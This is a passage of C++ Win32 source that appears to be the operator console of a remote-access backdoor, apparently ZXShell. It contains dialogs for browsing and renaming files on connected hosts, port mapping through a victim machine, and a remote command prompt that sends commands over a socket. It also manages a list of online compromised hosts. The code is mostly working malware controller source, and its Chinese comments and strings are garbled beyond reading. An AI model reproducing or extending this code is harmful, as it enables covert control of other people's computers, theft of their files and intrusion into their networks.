				   w, 
				   rcMe.bottom-rcMe.top,
				   TRUE); 
  
	}
	else if(idChild == IDC_ERRMSG)
	{
		GetWindowRect(hDlg, &rcMap);
  		GetWindowRect(hwndChild, &rcMe);
		ptMe.x = rcMap.left;
		ptMe.y = rcMap.bottom-(rcMe.bottom-rcMe.top)-5;
		ScreenToClient(hDlg, &ptMe);

		l = rcMap.left+10;

		GetWindowRect(GetDlgItem(hDlg,IDC_DIRPATH), &rcMap);

		r = rcMap.right;
		w = r - l - 4;

		MoveWindow(hwndChild, 
				   10, 
				   ptMe.y,
				   w, 
				   rcMe.bottom-rcMe.top,
				   TRUE); 

	}
	else if(idChild == IDC_FILELIST)
	{
		GetWindowRect(GetDlgItem(hDlg,IDC_DIRPATH), &rcup);
  		GetWindowRect(GetDlgItem(hDlg,IDC_ERRMSG), &rcdown);
		GetWindowRect(hwndChild, &rcMe);
		ptMe.x = rcdown.left;
		ptMe.y = rcup.bottom+3;
		ScreenToClient(hDlg, &ptMe);

		w = rcdown.right - rcdown.left;

		h = rcdown.top-rcup.bottom-5;

		GetWindowRect(GetDlgItem(hDlg,IDC_DIRPATH), &rcMap);

		MoveWindow(hwndChild, 
				   10, 
				   ptMe.y,
				   w, 
				   h,
				   TRUE); 
	}

 	//ShowWindow(hwndChild, SW_SHOW); 

    return TRUE;
}

//���ļ������������ڴ�������
int CALLBACK FileManagerDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	SHFILEINFO shFI;
	int ret;
	char szBuf[MAX_PATH];

	CFileManager *pFileMng = (CFileManager*)GetWindowLong(hDlg, GWL_USERDATA);
	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
		SetDlgItemText(hDlg, IDC_ERRMSG, "");

		ret = SHGetFileInfo("", 0, &shFI, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX|SHGFI_SMALLICON);
		SendDlgItemMessage(hDlg, IDC_FILELIST, LVM_SETIMAGELIST, LVSIL_SMALL, ret);

		HICON hIcon;
		
		hIcon = LoadIcon(Main.hInst, MAKEINTRESOURCE(IDI_FILEMGICON));
		SendMessage(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)hIcon);
		SendMessage(hDlg, WM_SETICON, ICON_BIG, (LPARAM)hIcon);

		InitFileMngPanel(hDlg);

		pFileMng = new CFileManager;
		pFileMng->Init((SOCKET)lParam);

		SetWindowLong(hDlg, GWL_USERDATA, (long)pFileMng);//save a object

		sprintf(szBuf, "\\\\%s", pFileMng->GetPeerIP());
		SetWindowText(hDlg, szBuf);

		//
		pFileMng->SetServerVer(3.10f);
		_tagConnInfo *pCI = g_CmdConnList.IsSocketInList((SOCKET)lParam);
		if(pCI)
		{
			_CZXServer *pZXS = g_ShellList.IsSocketInList(pCI->parentSocket);
			if(pZXS)
				pFileMng->SetServerVer(pZXS->ver);
		}

		//����IDC_FILELIST�ؼ�����Ϣ��������,������ԭ���ĺ�����ַΪIDC_FILELIST�ؼ��� GWL_USERDATA
		lParam = SetWindowLong(GetDlgItem(hDlg,IDC_FILELIST), GWL_WNDPROC, (long)FileListCtrlProc);
		SetWindowLong(GetDlgItem(hDlg,IDC_FILELIST), GWL_USERDATA, (long)lParam);
		DragAcceptFiles(GetDlgItem(hDlg,IDC_FILELIST), TRUE);

		HMENU hSysMenu = GetSystemMenu(hDlg, FALSE);
		AppendMenu(hSysMenu, MF_SEPARATOR, 0, 0);
		AppendMenu(hSysMenu, MF_STRING|MF_ENABLED, IDC_CONNINFO, "������Ϣ");

		//�Ȼ��Զ�̼�����ķ����б�
		GetAllDrivers(GetDlgItem(hDlg,IDC_DIRPATH), pFileMng);

		PostMessage(hDlg, WM_SIZE, 0, 0);
		SetForegroundWindow(hDlg);

		}
		return TRUE;

	case WM_SIZE:
	case WM_SIZING:
	{
		EnumChildWindows(hDlg, FileManagerPositionChildProc, (LPARAM) hDlg); 

	}
	return 0;

	case WM_NOTIFY:
		{
			NMHDR *pnhdr = (NMHDR*)lParam;
			//���������ļ�
			if(pnhdr->code == LVN_BEGINLABELEDIT)
			{
				NMLVDISPINFO * pdi = (NMLVDISPINFO*) lParam;
				return 0;
			}else if(pnhdr->code == LVN_ENDLABELEDIT)
			{
				//�༭��ǩ�����������������
				NMLVDISPINFO * pdi = (NMLVDISPINFO*) lParam;
				RenameFile(hDlg, pFileMng);
				return 0;		 
			}

		}
		break;

	case WM_COMMAND:
		switch(HIWORD(wParam))
		{
		case CBN_KILLFOCUS:
			{
				if(LOWORD(wParam) == IDC_DIRPATH)
				{
					GetDlgItemText(hDlg, IDC_DIRPATH, szBuf, MAX_PATH);
					sprintf(TempBuf, "%s\\", szBuf);
					FormatPathString(TempBuf, szBuf, MAX_PATH, true);
					if(stricmp(pFileMng->GetRemotePath(), szBuf))
						SendMessage(hDlg, WM_COMMAND, MAKEWPARAM(IDC_FILEMG_GO,0), 0);
				}
			}
			return 0;
		}
		switch(LOWORD(wParam))
		{
		case IDC_FILEMG_GO:
			if(pFileMng->cl.GetCount() != 0)//����CBN_KILLFOCUS����Ϣ��������������о�Ŀ¼����ֱ�ӷ���
				return 0;

			strcpy(szBuf, pFileMng->GetRemotePath());//���Ŀǰ·��
			if(GetFileList(hDlg, pFileMng) == -1)
			{
				SetDlgItemText(hDlg, IDC_DIRPATH, szBuf);//��ԭ·��
				err_display(GetDlgItem(hDlg, IDC_ERRMSG), 0, pFileMng->GetError());
			}
			return TRUE;

		case IDC_ABORT:
			EnableWindow(GetDlgItem(hDlg, IDC_ABORT), FALSE);
			pFileMng->Abort();
			break;
	
		}
		break;

	case WM_TIMER:
		{
			switch(wParam)
			{
			case WM_FILEMGQUIT:
				{
					if(pFileMng->Quit())
					{
						KillTimer(hDlg, WM_FILEMGQUIT);
						EndDialog(hDlg, LOWORD(wParam));
						delete pFileMng;
					}
				}
				break;
			}

		}
		return 0;

	case WM_SYSCOMMAND:
		switch(wParam)
		{
		case SC_CLOSE:

			//EnableMenuItem(::GetSystemMenu(hDlg, FALSE), SC_CLOSE,MF_BYCOMMAND|MF_GRAYED);//���ιرհ�ť
			if(pFileMng->Quit())
			{
				EndDialog(hDlg, LOWORD(wParam));
				delete pFileMng;
			}else
			{
				//��û��Quit��
				//���ø�timer��ʱ���pFileMng�����Ƿ���У����к����delete
				SetTimer(hDlg, WM_FILEMGQUIT, 100, 0);
			}
			return TRUE;
			
		case IDC_CONNINFO:
			{
				DialogBoxParam(Main.hInst, (LPCTSTR)IDD_CONNINFO, hDlg, (DLGPROC)ConnInfoDlgProc, pFileMng->GetSocket());
			}
			break;
		}


		break;
	}
	return FALSE;
}

int CALLBACK ConnInfoDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	int ret;

	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
			SetWindowLong(hDlg, GWL_USERDATA, (long)lParam);

			_tagConnInfo *pCI = g_CmdConnList.IsSocketInList(lParam);
			if(pCI == NULL)
				return FALSE;

			ret = GetHostItemIdxBySocket(pCI->parentSocket);
			if(ret < 0)
			{
				SetWindowText(GetDlgItem(hDlg, IDC_TEXT), "������������.");
				return FALSE;
			}

			char *content = NULL;
			CopyHostInfo(GetDlgItem(Main.hWnd, IDC_ONLINE), ret, 0, ONLINE_LVM_COLUMNCOUNT, &content);
			if(content)
			{
				char *psz = content;
				while(*psz)
				{
					if(*psz == '\t')
					{
						*psz = '\r';
						*(++psz) = '\n';
					}
					psz++;
				}
				SetWindowText(GetDlgItem(hDlg, IDC_TEXT), content);

				free(content);
			}

		}
		return TRUE;
	case WM_COMMAND:
		switch(wParam)
		{
		case IDC_GOBACK:
			{
				_CZXServer *zxserver;
				SOCKET Socket = GetWindowLong(hDlg, GWL_USERDATA);

				_tagConnInfo *pCI = g_CmdConnList.IsSocketInList(Socket);
				if(pCI == NULL)
					return FALSE;

				HWND hCtrl_online = GetDlgItem(Main.hWnd, IDC_ONLINE);

				ret = GetHostItemIdxBySocket(pCI->parentSocket);
				if(ret < 0)
				{
					SetWindowText(GetDlgItem(hDlg, IDC_TEXT), "������������.");
					return FALSE;
				}

				zxserver = g_ShellList.IsSocketInList(pCI->parentSocket);
				if(zxserver)
				{
					if(zxserver->hOutPutDlg2)
					{
						BringWindowToTop(zxserver->hOutPutDlg2);
						EndDialog(hDlg, true);
						return TRUE;	
					}
				}

				ListView_SetItemState(hCtrl_online, -1, 0, LVIS_SELECTED);
				ListView_SetItemState(hCtrl_online, ret, LVIS_SELECTED, LVIS_SELECTED);
				ListView_EnsureVisible(hCtrl_online, ret, FALSE);
				BringWindowToTop(Main.hWnd);
				EndDialog(hDlg, true);

			}

			return TRUE;		
		}
		break;

	case WM_SYSCOMMAND:
		switch(wParam)
		{
		case SC_CLOSE:
			EndDialog(hDlg, true);
			return TRUE;		
		}
		break;

	}
	return FALSE;
}

//���˿�ӳ�䡿���ڴ�������
int CALLBACK PortMapDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	int ret;
	char szBuf[MAX_PATH];

	int LocalPort, RemotePort;

	CCREALPORTMAP *pPortMap = (CCREALPORTMAP*)GetWindowLong(hDlg, GWL_USERDATA);


	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
		//�׽��ֲ��� lParam
		pPortMap = new CCREALPORTMAP(lParam);
		SetWindowLong(hDlg, GWL_USERDATA, (long)0);
		SetWindowLong(hDlg, GWL_USERDATA, (long)pPortMap);//save a object

		HICON hIcon;
		
		hIcon = LoadIcon(Main.hInst, MAKEINTRESOURCE(IDI_ICON_PORTMAP));
		SendMessage(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)hIcon);
		SendMessage(hDlg, WM_SETICON, ICON_BIG, (LPARAM)hIcon);


		HMENU hSysMenu = GetSystemMenu(hDlg, FALSE);
		AppendMenu(hSysMenu, MF_SEPARATOR, 0, 0);
		AppendMenu(hSysMenu, MF_STRING|MF_ENABLED, IDC_CONNINFO, "������Ϣ");

		sprintf(szBuf, "\\\\%s", pPortMap->GetPeerIP());
		SetDlgItemText(hDlg, IDC_HOSTNAME, szBuf);
		SetDlgItemText(hDlg, IDC_REMOTEIP, "127.0.0.1");

		SetForegroundWindow(hDlg);

		}
		return TRUE;


	case WM_TIMER:

		if(pPortMap)
		{
			if(pPortMap->GetErrorCode() == 0)
			{
				sprintf(szBuf, "��ǰ������: %d", pPortMap->GetConnCount());
				SetDlgItemText(hDlg, IDC_ERROR, szBuf);
			}else
			{
				SetDlgItemText(hDlg, IDC_ERROR, pPortMap->GetErrorString());
				if(GetForegroundWindow() != hDlg)
					FlashWindow(hDlg, TRUE);

			}
		}
		break;

	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			szBuf[0] = '\0';
			GetDlgItemText(hDlg, IDC_REMOTEIP, szBuf, sizeof(szBuf));
			RemotePort = GetDlgItemInt(hDlg, IDC_REMOTEPORT, NULL, FALSE);
			LocalPort = GetDlgItemInt(hDlg, IDC_LOCALPORT, NULL, FALSE);
			if(!szBuf[0])
			{
				MessageBox(hDlg, MB_ICONERROR, "����", "��û��дIP��ַ.���Ҫӳ�����Ŀ��������������127.0.0.1");
				SetDlgItemText(hDlg, IDC_ERROR, "����ȷ��дIP��ַ,����������");
				break;
			}
			if(!RemotePort || !LocalPort)
			{
				SetDlgItemText(hDlg, IDC_ERROR, "����ȷ��д�˿�");
				break;
			}
			pPortMap->SetMapPort(LocalPort);
			
			if(!pPortMap->listenThread(pPortMap))
			{
				SetDlgItemText(hDlg, IDC_ERROR, pPortMap->GetErrorString());
				break;
			}
			if(!pPortMap->SendConfigInfo(szBuf, RemotePort))
			{
				SetDlgItemText(hDlg, IDC_ERROR, pPortMap->GetErrorString());
				break;
			}

			if(!pPortMap->start())
			{
				SetDlgItemText(hDlg, IDC_ERROR, pPortMap->GetErrorString());
				break;
			}
			SetDlgItemText(hDlg, IDC_ERROR, "OK......");
			EnableWindow(GetDlgItem(hDlg, IDOK), FALSE);
			SendDlgItemMessage(hDlg, IDC_REMOTEIP, EM_SETREADONLY, TRUE, 0);
			SendDlgItemMessage(hDlg, IDC_REMOTEPORT, EM_SETREADONLY, TRUE, 0);
			SendDlgItemMessage(hDlg, IDC_LOCALPORT, EM_SETREADONLY, TRUE, 0);

			SetTimer(hDlg, 1, 500, NULL);
			return TRUE;

		case IDCANCEL:
			EnableMenuItem(::GetSystemMenu(hDlg, FALSE), SC_CLOSE,MF_BYCOMMAND|MF_GRAYED);
			EnableWindow(GetDlgItem(hDlg, IDCANCEL), FALSE);
			KillTimer(hDlg, 1);
			SetDlgItemText(hDlg, IDC_ERROR, "�����˳�......");
			ret = pPortMap->stop();
			pPortMap->wait();
			if(ret)//bug bug
				delete pPortMap;
			EndDialog(hDlg, LOWORD(wParam));
			return TRUE;
		}
		break;

	case WM_SYSCOMMAND:
		switch(wParam)
		{
		case IDC_CONNINFO:
			{
				DialogBoxParam(Main.hInst, (LPCTSTR)IDD_CONNINFO, hDlg, (DLGPROC)ConnInfoDlgProc, pPortMap->GetSocket());
			}
			break;
		}
	}
	return FALSE;
}

//������������ʾ�������з�������ʱ�Ļس����¼�
BOOL PreTranslateMessage_GETCMD(MSG *pMsg, HWND hwnd)     
{   
	if(hwnd == GetParent(GetFocus()))//�жϽ����ڲ��ڿ���   
	{
		if(pMsg->message==WM_KEYDOWN)   
		{
			if(pMsg->wParam == VK_RETURN)   
			{
				return TRUE;
			}   
		}
	}

	return FALSE;
}

//������������ʾ�����ڣ�������׽��ֹ���
int Startup_GETCMD(SOCKET Socket)
{

	int retval;
	char szCmdLine[MAX_PATH+3];

	HWND hWnd_cmd = CreateDialogParam(Main.hInst, MAKEINTRESOURCE(IDD_GETCMD), 0, GetCMDDlgProc, Socket);

	if(!hWnd_cmd)
		return 0;

	SendMessage(GetDlgItem(hWnd_cmd, IDC_RESULT), EM_SETLIMITTEXT, 0, 0);

	HWND hCmd = GetDlgItem(hWnd_cmd, IDC_CMD);

	ShowWindow(hWnd_cmd, SW_SHOWNORMAL);

	retval = WSAAsyncSelect(Socket, hWnd_cmd, WM_SOCKET, FD_READ|FD_CLOSE);
	if(retval == SOCKET_ERROR) {
		MessageBox(hWnd_cmd, MB_ICONERROR, "����", "�����Ѿ�����.");
		SendDlgItemMessage(hWnd_cmd, IDC_RESULT, EM_SETREADONLY, TRUE, 0);
		EnableWindow(hCmd, FALSE);
	}

	MSG msg;
	while(GetMessage(&msg, 0, 0, 0))
	{
		if(PreTranslateMessage_GETCMD(&msg, hCmd))
		{
			if(GetWindowTextLength(hCmd) < MAX_PATH)
			{
				int len = GetWindowText(hCmd, szCmdLine, MAX_PATH);
				szCmdLine[len] = '\0';

				//���µ�����ӵ��б���
				if((retval = SendMessage(hCmd, CB_FINDSTRINGEXACT, 0, (LPARAM)szCmdLine)) != CB_ERR)
				{
					//�Դ�������м�ɾ����
					SendMessage(hCmd, CB_DELETESTRING, retval, 0);
				}else
				{
					if((retval = SendMessage(hCmd, CB_GETCOUNT, 0, 0)) >= 10)
					{
						SendMessage(hCmd, CB_DELETESTRING, retval-1, 0);
					}
				}

				SendMessage(hCmd, CB_INSERTSTRING, 0, LPARAM(szCmdLine));

				strcat(szCmdLine, "\r\n");
				if(!__Send(Socket, szCmdLine, len+2, 15))
				{
					PostMessage(hWnd_cmd, WM_SOCKET, Socket, FD_CLOSE);
				}
				SetWindowText(hCmd, "");


				continue;
			}else
			{
				MessageBox(hWnd_cmd, MB_ICONERROR, "����", "����Ȳ��ܳ���256���ֽ�.");
			}
		}


		if(!IsDialogMessage(hWnd_cmd, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	closesocket(Socket);

	return true;
}

//������������ʾ����Ϣ�����
BOOL OutPutCMDResult(HWND hWnd,char *szBuf)
{
	SETTEXTEX stex;
	stex.flags = ST_KEEPUNDO;
	stex.codepage = CP_ACP;

	HWND hResult = GetDlgItem(hWnd, IDC_RESULT);

	SendMessage(hResult, EM_SETSEL, 0, -1);//select all the text
	SendMessage(hResult, EM_SETSEL, (WPARAM)-1, (LPARAM)0);//deselect any selection
	//now the cursor postion has changed to the end.
	SendMessage(hResult, EM_REPLACESEL, TRUE, (LPARAM)szBuf);

	if(GetForegroundWindow() != hWnd)
		FlashWindow(hWnd, TRUE);


	return TRUE;
}

//����������ʾ�����ڹ������׽��ִ�������
void ProcessCMDMessage(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	int retval = 0;
	char szBuf[MAX_PATH];
	SOCKET Socket = (SOCKET)GetWindowLong(hWnd, GWL_USERDATA);


	if(WSAGETSELECTERROR(lParam)){
		PostMessage(hWnd, WM_SOCKET, wParam, FD_CLOSE);
		return;
	}

	switch(WSAGETSELECTEVENT(lParam)){
	case FD_READ:
		if(Socket == wParam)
		{
			retval = recv(Socket, szBuf, sizeof(szBuf)-1, 0);
			if(retval >= 0)
			{
				szBuf[retval] = '\0';
				OutPutCMDResult(hWnd, szBuf);
			}
		}

		break;

	case FD_CLOSE:
		if(GetForegroundWindow() != hWnd)
			FlashWindow(hWnd, TRUE);
		WSAAsyncSelect(wParam, hWnd, 0, 0);
		MessageBox(hWnd, MB_ICONERROR, "����", "�����Ѿ��ر�.");
		SendDlgItemMessage(hWnd, IDC_RESULT, EM_SETREADONLY, TRUE, 0);
		EnableWindow(GetDlgItem(hWnd, IDC_CMD), FALSE);

		break;
	}
}
//��������ʾ�����ڴ�������
int CALLBACK GetCMDDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	char szBuf[MAX_PATH];

	SOCKET Socket = (SOCKET)GetWindowLong(hDlg, GWL_USERDATA);

	switch(uMsg)
	{
	case WM_INITDIALOG:
		{
		//�׽��ֲ��� lParam
		SetWindowLong(hDlg, GWL_USERDATA, 0);
		SetWindowLong(hDlg, GWL_USERDATA, lParam);//save a socket

		HICON hIcon;
		
		hIcon = LoadIcon(Main.hInst, MAKEINTRESOURCE(IDI_CMDICON));
		SendMessage(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)hIcon);
		SendMessage(hDlg, WM_SETICON, ICON_BIG, (LPARAM)hIcon);

		HMENU hSysMenu = GetSystemMenu(hDlg, FALSE);
		AppendMenu(hSysMenu, MF_SEPARATOR, 0, 0);
		AppendMenu(hSysMenu, MF_STRING|MF_ENABLED, IDC_CONNINFO, "������Ϣ");

		sprintf(szBuf, "������ʾ�� \\\\%s", GetPeerIPStr(lParam));
		SetWindowText(hDlg, szBuf);

		SetForegroundWindow(hDlg);
		}
		return TRUE;

	case WM_SOCKET:
		ProcessCMDMessage(hDlg, uMsg, wParam, lParam);
		return 0;
	case WM_SYSCOMMAND:
		switch(wParam)
		{
		case SC_CLOSE:
			PostQuitMessage(0);
			return TRUE;
		case IDC_CONNINFO:
			{
				DialogBoxParam(Main.hInst, (LPCTSTR)IDD_CONNINFO, hDlg, (DLGPROC)ConnInfoDlgProc, Socket);
			}
			break;			
		}
		break;

	}
	return FALSE;
}

//�׽����봰�ڹ����Ĵ�������
LRESULT CALLBACK SocketMsgProc(HWND hWnd, UINT uMsg, 
	WPARAM wParam, LPARAM lParam)
{
	switch(uMsg){
	case WM_SOCKET:
		ProcessSocketMessage(hWnd, uMsg, wParam, lParam);
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void SetClipText(LPSTR text)
{
	// Open the system clipboard
	if (OpenClipboard(NULL))
	{
		// Empty it
		if (EmptyClipboard())
		{
			HANDLE hMem = GlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, strlen(text)+1);

			if (hMem != NULL)
			{
				LPSTR pMem = (char*)GlobalLock(hMem);

				// Get the data
				strcpy(pMem, text);

				// Tell the clipboard
				GlobalUnlock(hMem);
				SetClipboardData(CF_TEXT, hMem);
			}
		}
	}

	// Now close it
	CloseClipboard();
}

int CopyHostInfo(HWND hCtrl, const int index, int start_iSubItem, int count_SubItem, char **buf)
{
	int selIdx, ret=0;
	int end_iSubItem = start_iSubItem+count_SubItem;
	SOCKET Socket;
	LVITEM lv1;
	int lines = 0;
	int textlen = 0;
	char *content = 0;

	if(index == -1)
		nextHostIdx = -1;

	while(1)
	{
		if(index == -1)//����б�������ѡ�е�����
		{
			selIdx = GetSelectedItems(&Socket);//(����������Ϊ1��0��ʾûѡ�е�)
			if(!selIdx)
				break;
			selIdx--;//��Ϊ��0Ϊ������
			//
		}else
		{
			selIdx = index;//���ָ���������б�����
			if(lines > 0)//���һ�о͹���
				break;
		}

		char pszText1[MAX_PATH+1] = {0};

		memset(&lv1, 0, sizeof(LVITEM));
		lv1.mask = LVIF_TEXT;
		lv1.iSubItem = start_iSubItem-1;

		if(content)
		{
			memcpy(content+textlen, "\r\n", 2);
			textlen+=2;
		}
		
		while(lv1.iSubItem < end_iSubItem-1)
		{
			lv1.pszText = pszText1;
			lv1.cchTextMax = MAX_PATH;

			lv1.iSubItem++;
			lv1.iItem = selIdx;

			if(!SendMessage(hCtrl, LVM_GETITEM, 0, LPARAM(&lv1)))
				break;

			ret = sprintf(pszText1, "%s%s", pszText1, (lv1.iSubItem<end_iSubItem-1)?"\t ":"");

			content = (char*)realloc(content, textlen+ret+3);
			if(content)
				memcpy(content+textlen, pszText1, ret);

			textlen += ret;
			
		}

		lines++;

	}
	if(content)
	{
		content[textlen] = 0;
		*buf = content;
		return lines;
	}
	return 0;
}

int SearchHostByString(HWND hCtrl, int iItem, int iSubItem, char *searchString, bool clearSelected)
{
	int totalCount, selCount, StartIdx, ret;
	LVITEM lv1;

	totalCount = ListView_GetItemCount(hCtrl);

	StartIdx = iItem;

	selCount = 0;

	if(clearSelected)
		ListView_SetItemState(hCtrl, -1, 0, LVIS_SELECTED);

	//POINT pt;
	//ListView_GetItemPosition(hCtrl, 0, &pt);
	while(StartIdx < totalCount)
	{
		char pszText1[MAX_PATH+1] = {0};

		memset(&lv1, 0, sizeof(LVITEM));

		lv1.mask = LVIF_TEXT;
		lv1.iSubItem = iSubItem;

		lv1.pszText = pszText1;
		lv1.cchTextMax = MAX_PATH;

		lv1.iItem = StartIdx;

		if(!ListView_GetItem (hCtrl, LPARAM(&lv1)))
			break;

		if(strstr(strupr(pszText1), strupr(searchString)))
		{
			//ListView_SetItemPosition32(hCtrl, StartIdx, pt.x, pt.y);
			ListView_SetItemState(hCtrl, StartIdx, LVIS_SELECTED, LVIS_SELECTED);
			selCount++;
		}

		StartIdx++;
	}

	return selCount;
}

//�������б����з�ѡ
int CALLBACK LV_ReverseSelectItems(HWND hCtrl)
{
	int totalCount, selCount, StartIdx, ret;

	totalCount = ListView_GetItemCount(hCtrl);

	StartIdx = 0;

	while(StartIdx < totalCount)
	{

		if(ListView_GetItemState(hCtrl, StartIdx, LVIS_SELECTED))
		{
			ListView_SetItemState(hCtrl, StartIdx, 0, LVIS_SELECTED);
		}else
		{
			ListView_SetItemState(hCtrl, StartIdx, LVIS_SELECTED, LVIS_SELECTED);
		}

		StartIdx++;
	}

	
	return StartIdx;
}


//��ѡ�е������õ�
int CALLBACK LV_DownItems(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	int idx1=lParam1,idx2=lParam2;

	HWND hCtrl = (HWND)lParamSort;

	if(SendMessage(hCtrl, LVM_GETITEMSTATE, idx1, LVIS_SELECTED))
		return 1;

	return 0;
}

//�����ظ����ߵ�����, �ж�IP��������Ϣ����һ�µ���ѡ��
int CALLBACK LV_FindRepeatedHost(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	int idx1=lParam1,idx2=lParam2;

	HWND hCtrl = (HWND)lParamSort;

	LVITEM lv1, lv2;
	char pszText1[MAX_PATH+1] = {0};
	char pszText2[MAX_PATH+1] = {0};

	memset(&lv1, 0, sizeof(LVITEM));
	memset(&lv2, 0, sizeof(LVITEM));

	lv1.mask = LVIF_TEXT|LVIF_PARAM;
	lv1.iSubItem = 0;
	lv1.pszText = pszText1;
	lv1.cchTextMax = MAX_PATH;
	lv1.iItem = idx1;

	lv2.mask = LVIF_TEXT|LVIF_PARAM;
	lv2.iSubItem = 0;
	lv2.pszText = pszText2;
	lv2.cchTextMax = MAX_PATH;
	lv2.iItem = idx2;


	if(!ListView_GetItem(hCtrl, LPARAM(&lv1)))
		return 0;
	if(!ListView_GetItem(hCtrl, LPARAM(&lv2)))
		return 0;

	if(!stricmp(GetPeerIPStr(lv1.lParam), GetPeerIPStr(lv2.lParam)))
	{
		if(!stricmp(pszText1, pszText2))
		{
			ListView_SetItemState(hCtrl, idx1, LVIS_SELECTED, LVIS_SELECTED);
			ListView_SetItemState(hCtrl, idx2, LVIS_SELECTED, LVIS_SELECTED);
		}
	}

	return 0;
}

//���������Ĵ��ڴ�������
int CALLBACK GetSearchStringProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	char *pStringBuf = (char*)GetWindowLong(hDlg, GWL_USERDATA);

	switch(uMsg)
	{
	case WM_INITDIALOG:
		SetWindowLong(hDlg, GWL_USERDATA, (long)lParam);
		SetWindowText(hDlg, (char*)lParam);
		SetActiveWindow(GetDlgItem(hDlg, IDC_STRING));

		return true;
	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case IDOK:
			memset(pStringBuf, 0, MAX_PATH);
			GetDlgItemText(hDlg, IDC_STRING, pStringBuf, MAX_PATH);

			if(BST_CHECKED == IsDlgButtonChecked(hDlg, IDC_FH_CLEAR))
				EndDialog(hDlg, 2);
			else
				EndDialog(hDlg, 1);
			return true;
		case IDCANCEL:
			EndDialog(hDlg, 0);
			return false;
		}
		break;
	}
	return false;
}

//�����б�ListView�ؼ��Ĵ�������,
int CALLBACK OnlineListCtrlProc(HWND hCtrl, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static POINT online_LVM_menu_pt;
	NMLISTVIEW *pnmh;
	WNDPROC OldMsgProc = (WNDPROC)GetWindowLong(hCtrl, GWL_USERDATA);

	switch(uMsg)
	{
	case WM_INITDIALOG:
		return TRUE;


	case WM_CONTEXTMENU://�Ҽ��ɿ��¼�
		{
			HMENU hMenu = LoadMenu(Main.hInst, MAKEINTRESOURCE(IDR_ONLINE_MENU));

			if(hMenu)
			{
				
				GetCursorPos(&online_LVM_menu_pt);
				TrackPopupMenu(GetSubMenu(hMenu, 0), 
					TPM_LEFTBUTTON, 
					online_LVM_menu_pt.x, 
					online_LVM_menu_pt.y,
					0,
					hCtrl,
					0);

				DestroyMenu(hMenu);

			}
		}
		break;


	case WM_NOTIFY:
		pnmh = (LPNMLISTVIEW)lParam;

		//����������������
		if(pnmh->hdr.code == 0xfffffebe)//left mouse click
		{
			//sprintf(TempBuf, "%x %d\r\n", pnmh->hdr.code, pnmh->iItem);
			//OutPutResult(TempBuf);
	
			int ret = ListView_SortItemsEx(hCtrl, SortListViewCompareFunc, lParam);
		}
		break;

	case WM_COMMAND:
		switch(LOWORD(wParam))
		{
		case ID_HOSTABORT:
			AbortConn();
			break;

		case ID_COPYLINE://������
			{
				char *content = NULL;
				int ret = CopyHostInfo(hCtrl, -1, 0, ONLINE_LVM_COLUMNCOUNT, &content);
				if(content)
				{
					SetClipText(content);
					free(content);
					MessageBox(hCtrl, MB_ICONINFORMATION, "ע��", "�Ѹ��� %d �е�������.", ret);
				}

			}
			break;
		case ID_COPYCOL://���и���
			{
				LVHITTESTINFO lvht;

				ScreenToClient(hCtrl, &online_LVM_menu_pt);

				lvht.pt = online_LVM_menu_pt;

				lvht.flags = LVHT_ONITEMLABEL|LVHT_ABOVE;
				lvht.iSubItem = 0;
				if(ListView_SubItemHitTest(hCtrl, &lvht) != -1)
				{
					char *content = NULL;
					int ret = CopyHostInfo(hCtrl, -1, lvht.iSubItem, 1, &content);
					if(content)
					{
						SetClipText(content);
						free(content);
						MessageBox(hCtrl, MB_ICONINFORMATION, "ע��", "�Ѹ��� %d �е�������.", ret);
					}

				}

			}
			break;
		case ID_FINDHOST://��������
			{
				char szSearch[MAX_PATH]="��������";
				LVHITTESTINFO lvht;
				ScreenToClient(hCtrl, &online_LVM_menu_pt);

				lvht.pt = online_LVM_menu_pt;

				lvht.flags = LVHT_ONITEMLABEL;
				lvht.iSubItem = 0;
				if(ListView_SubItemHitTest(hCtrl, &lvht) == -1)
					return 0;

				int ret = DialogBoxParam(Main.hInst, (LPCTSTR)IDD_FINDHOST, hCtrl, (DLGPROC)GetSearchStringProc, (LPARAM)szSearch);
				if(!ret || !szSearch[0])
				{
					return 0;
				}

				bool clearSelected = false;

				if(ret == 2)
					clearSelected = true;

				ret = SearchHostByString(hCtrl, lvht.iItem, lvht.iSubItem, szSearch, clearSelected);
				if(ret)
				{
					MessageBox(hCtrl, MB_ICONINFORMATION, "ע��", "�ҵ� %d �����϶���.", ret);
				
					//if(ret == 1)
					{
						ret = GetSelectedItems(NULL);
						ListView_EnsureVisible(hCtrl, ret-1, FALSE);
					}
				}
			}
			break;

		//��ѡ�е����õ�
		case ID_POSUP:
			{
				ListView_SortItemsEx(hCtrl, LV_DownItems, (LPARAM)hCtrl);
				int ret = GetSelectedItems(NULL);
				ListView_EnsureVisible(hCtrl, ret-1, FALSE);

			}
			break;
		//��ѡ
		case ID_REVERSESELECTEDHOST:
			{
				LV_ReverseSelectItems(hCtrl);
			}
			break;

		//��������ͬ���������ظ�����
		case ID_FINDREPEATHOST:
			{

				int ret;
				NMLISTVIEW nmh;

				nmh.iItem = 0;
				nmh.hdr.hwndFrom = GetDlgItem(hCtrl, 0);

				//sprintf(TempBuf, "%x %d\r\n", pnmh->hdr.code, pnmh->iItem);
				//OutPutResult(TempBuf);
